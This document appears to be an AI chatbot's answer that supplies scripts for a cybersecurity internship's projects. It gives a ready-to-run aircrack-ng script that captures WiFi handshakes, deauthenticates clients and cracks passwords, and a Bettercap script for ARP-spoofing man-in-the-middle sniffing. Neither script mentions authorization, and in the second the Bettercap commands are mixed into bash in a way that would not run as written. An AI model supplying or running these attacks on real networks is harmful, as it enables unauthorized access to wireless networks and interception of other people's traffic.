
Here are the programs and scripts related to your tasks in the CFSS Cybersecurity Paid Internship Program:

Project 1: Exploring WiFi Security
WiFi Hacking Techniques (using Aircrack-ng for Password Cracking)
To crack WiFi passwords using Aircrack-ng, here is a script that demonstrates password cracking on a captured handshake file.

bash
Copy code
#!/bin/bash
# WiFi password cracking script using Aircrack-ng

# Capture a handshake
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --bssid [AP BSSID] -c [Channel] -w capture

# Deauthenticate to capture handshake
sudo aireplay-ng --deauth 10 -a [AP BSSID] wlan0mon

# Crack the password with a wordlist
sudo aircrack-ng -w /path/to/wordlist.txt -b [AP BSSID] capture*.cap
Note: Replace [AP BSSID], [Channel], and /path/to/wordlist.txt with actual values.

Project 2: MITM Attack Exploration with Bettercap
Performing MITM Attack Using Bettercap
Here's a script to perform a basic MITM attack using Bettercap to capture HTTP packets.

bash
Copy code
#!/bin/bash
# MITM attack using Bettercap

# Start Bettercap and enable packet forwarding
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -caplet http-req-dump

# Enable ARP Spoofing (replace target IP and router IP with actual values)
set arp.spoof.targets [TARGET_IP]
set arp.spoof.fullduplex true
arp.spoof on

# Intercept traffic
net.sniff on
